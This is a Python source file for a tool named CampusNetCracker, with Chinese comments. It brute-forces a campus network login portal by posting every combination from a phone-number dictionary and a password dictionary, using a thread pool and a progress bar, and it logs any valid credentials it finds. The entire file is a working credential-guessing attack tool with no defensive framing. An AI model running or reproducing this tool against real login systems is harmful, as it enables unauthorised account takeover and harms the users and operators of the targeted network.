import requests
import logging
import concurrent.futures
import os
import signal
import sys
from pathlib import Path
from typing import Dict, Optional
from tqdm import tqdm
from config import BruteForceConfig, setup_logging

def detect_proxy():
    """检测系统代理设置"""
    proxy = os.environ.get('HTTP_PROXY') or os.environ.get('HTTPS_PROXY')
    if proxy:
        return proxy
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                          r'Software\Microsoft\Windows\CurrentVersion\Internet Settings') as key:
            proxy_enable = winreg.QueryValueEx(key, 'ProxyEnable')[0]
            if proxy_enable:
                return winreg.QueryValueEx(key, 'ProxyServer')[0]
    except:
        pass
    return None

class CampusNetCracker:
    def __init__(self):
        self.config = BruteForceConfig()
        self.logger = logging.getLogger(__name__)
        self.success_count = 0
        self.shutdown_flag = False
        # 设置Ctrl+C信号处理器
        signal.signal(signal.SIGINT, self._handle_interrupt)
        
    def load_dict(self, filename: str) -> list:
        """加载字典文件"""
        path = Path("BruteForce/dicts") / filename
        with open(path, "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    
    def try_login(self, username: str, password: str) -> Optional[Dict]:
        """尝试登录并返回响应"""
        try:
            # 准备请求参数
            params = self.config.login_params.copy()
            data = self.config.login_data.copy()
            data["DDDDD"] = data["DDDDD"].format(username)
            data["upass"] = password
            
            # 发送请求
            url = f"{self.config.base_url}{self.config.login_path}"
            # 处理代理设置
            proxies = None
            if 'Proxy' in self.config.headers:
                proxies = {
                    'http': self.config.headers['Proxy'],
                    'https': self.config.headers['Proxy']
                }
                # 移除headers中的Proxy，避免被误认为请求头
                headers = self.config.headers.copy()
                headers.pop('Proxy', None)
            else:
                headers = self.config.headers

            response = requests.post(
                url,
                params=params,
                data=data,
                headers=headers,
                proxies=proxies,
                timeout=10
            )
            
            # 记录响应
            result = {
                "username": username,
                "password": password,
                "status_code": response.status_code,
                "response": response.text,
                "success": "success" in response.text.lower()
            }
            
            if result["success"]:
                self.success_count += 1
                self.logger.info(f"Success! {username}:{password}")
            else:
                self.logger.debug(f"Failed attempt: {username}:{password}")
                
            return result
            
        except Exception as e:
            self.logger.error(f"Error trying {username}:{password} - {str(e)}")
            return None
    
    def _handle_interrupt(self, signum, frame):
        """处理Ctrl+C中断信号"""
        self.shutdown_flag = True
        self.logger.warning("接收到中断信号，正在优雅关闭...")

    def brute_force(self, phone_dict: str, password_dict: str, max_workers: int = None):
        """执行爆破"""
        setup_logging()
        self.shutdown_flag = False  # 重置中断标志
        
        # 检测代理并调整并发策略
        proxy = detect_proxy()
        if proxy:
            self.logger.warning(f"检测到系统代理: {proxy}")
            if max_workers is None or max_workers > 2:
                max_workers = 2  # 使用代理时降低并发数
                self.logger.warning("由于存在代理，并发数已调整为2")
        elif max_workers is None:
            max_workers = 5  # 默认并发数
            
        # 设置代理
        if proxy:
            self.config.headers['Proxy'] = proxy
        
        # 加载字典
        phones = self.load_dict(phone_dict)
        passwords = self.load_dict(password_dict)
        self.logger.info(f"Loaded {len(phones)} phones and {len(passwords)} passwords")
        
        # 多线程爆破
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            for phone in phones:
                for pwd in passwords:
                    futures.append(executor.submit(self.try_login, phone, pwd))
            
            # 进度条显示
            try:
                for future in tqdm(concurrent.futures.as_completed(futures), 
                                 total=len(futures),
                                 desc="Brute forcing"):
                    if self.shutdown_flag:
                        self.logger.warning("正在取消剩余任务...")
                        for f in futures:
                            f.cancel()
                        break
            except KeyboardInterrupt:
                self.logger.warning("用户中断操作")
                for f in futures:
                    f.cancel()
                raise
        
        self.logger.info(f"Brute force completed. Found {self.success_count} valid credentials")

if __name__ == "__main__":
    cracker = CampusNetCracker()
    cracker.brute_force("phone_dict.txt", "password_dict.txt")
